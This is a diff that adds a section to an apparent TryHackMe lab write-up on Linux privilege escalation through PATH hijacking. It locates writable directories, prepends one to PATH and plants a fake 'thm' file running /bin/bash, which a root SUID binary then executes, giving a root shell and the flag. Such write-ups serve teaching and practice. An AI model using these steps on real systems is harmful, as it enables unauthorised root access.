@@ -215,4 +215,92 @@ THM-X
 
 After the cron job executes, we receive a reverse shell as root.
 
+# Privilege Escalation: PATH
 
+PATH is an environment variable in Unix/Linux systems that tells the shell where to look for executable programs when you type a command.
+
+```
+$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+```
+
+If a program calls another binary without using an absolute path (e.g., thm instead of /usr/bin/thm), the system will search for it in the directories listed in PATH, from left to right.
+
+To find directories where we have write permissions, we can use:
+
+```
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+```
+
+Example output:
+
+```
+$ find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+dev/char
+dev/fd
+...
+home/murdoch
+...
+tmp
+var/tmp
+```
+
+We can see that /home/murdoch is writable.
+
+Now we prepend this directory to the PATH variable:
+
+```
+$ export PATH=/home/murdoch:$PATH
+$ echo $PATH
+/home/murdoch:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+```
+
+Now the system searches /home/murdoch before system directories like /usr/bin.
+
+This means that any command name found in /home/murdoch will be executed first.
+
+Directory contents:
+
+```
+$ ls -l
+total 24
+-rwsr-xr-x 1 root root 16712 Jun 20  2021 test
+-rw-rw-r-- 1 root root    86 Jun 20  2021 thm.py
+```
+
+We can see that test is a SUID binary owned by root.
+
+Now let’s inspect thm.py:
+
+```
+$ cat thm.py
+/usr/bin/python3
+
+import os
+import sys
+
+try:
+    os.system("thm")
+except:
+    sys.exit()
+```
+
+The script calls thm without specifying the full path.
+This makes it vulnerable to PATH hijacking.
+
+We now create our own malicious thm file inside /home/murdoch:
+
+```
+$ echo "/bin/bash" > thm
+$ chmod 777 thm
+```
+
+When the SUID-root program executes and calls thm, it will run our malicious file instead of a legitimate system binary.
+
+```
+$ ./test
+root@ip-10-66-167-91:/home/murdoch# cat /home/matt/flag6.txt
+THM-X
+```
+
+Because test runs with root privileges and relies on a relative command name, we successfully hijacked execution flow and gained a root shell.
